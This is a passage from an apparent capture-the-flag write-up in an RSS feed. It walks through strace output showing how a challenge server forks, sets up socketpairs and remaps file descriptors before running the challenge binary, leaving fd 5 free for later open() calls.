<p><strong>PID 9</strong> closed the socket connection and was out of the picture.</p>
<pre tabindex="0"><code>[pid     9] close(6)                    = 0
</code></pre><p>Meanwhile, <strong>PID 10</strong> (returned by the original <strong>clone()</strong> call), closed <strong>3</strong>, <strong>4</strong> and re-registered the socketpair. It further registered a new socket pair <strong>5</strong>, <strong>7</strong> after closing the socket <strong>5</strong>. But this one kept fd <strong>6</strong> pointing to current connection. Next, it **clone()**s again to create <strong>PID 11</strong>. Finally it closes <strong>7</strong>, thus it would be using <strong>5</strong> for communication</p>
<pre tabindex="0"><code>clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f06e36fda10) = 10

[pid    10] close(4 &lt;unfinished ...&gt;
[pid    10] &lt;... close resumed&gt;)        = 0
[pid    10] close(3)                    = 0
[pid    10] socketpair(AF_UNIX, SOCK_DGRAM, 0, [3, 4]) = 0
...
[pid    10] close(5)                    = 0
[pid    10] socketpair(AF_UNIX, SOCK_STREAM, 0, [5, 7]) = 0
...
[pid    10] clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLDstrace: Process 11 attached
 &lt;unfinished ...&gt;
...
[pid    10] close(7)
</code></pre><p>And finally, <strong>PID 11</strong> closed <strong>3</strong>, <strong>4</strong>, <strong>5</strong> (socketpairs created by <strong>PID 10</strong>). Re-creates two socketpairs 3-4. Duplicated <strong>7</strong> as stdin and stdout and closed <strong>7</strong>. Finally <strong>PID 11</strong> loads <strong>finale</strong> binary into memory.</p>
<pre tabindex="0"><code>[pid    11] close(4 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
[pid    11] close(3 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
...
[pid    11] socketpair(AF_UNIX, SOCK_DGRAM, 0 &lt;unfinished ...&gt;
[pid    11] &lt;... socketpair resumed&gt;, [3, 4]) = 0
...
[pid    11] close(5 &lt;unfinished ...&gt;
[pid    11] &lt;... close resumed&gt;)        = 0
...
[pid    11] dup2(7, 0 &lt;unfinished ...&gt;
[pid    11] &lt;... dup2 resumed&gt;)         = 0
[pid    11] dup2(7, 1 &lt;unfinished ...&gt;
[pid    11] &lt;... dup2 resumed&gt;)         = 1
[pid    11] close(7)                    = 0
[pid    11] execve(&#34;./challengeBinary&#34;, [&#34;./challengeBinary&#34;], 0x5603cdb74e40 /* 12 vars */ &lt;unfinished ...&gt;
</code></pre><p>When <strong>finale</strong> was loaded, it had following file descriptors</p>
<ul>
<li>0 - pointing to socketpair to communicate with <strong>PID 10</strong></li>
<li>1 - pointing to socketpair to communicate with <strong>PID 10</strong></li>
<li>2 - stderr</li>
<li>3 - pointing to socketpair it (<strong>PID 11</strong>) created</li>
<li>4 - pointing to socketpair it (<strong>PID 11</strong>) created</li>
<li>5 - FREE</li>
</ul>
<p>Thus, 5 was allocated to all subsequent **open()**s</p>
]]></description>
      
    </item>
    
    
  </channel>
</rss>
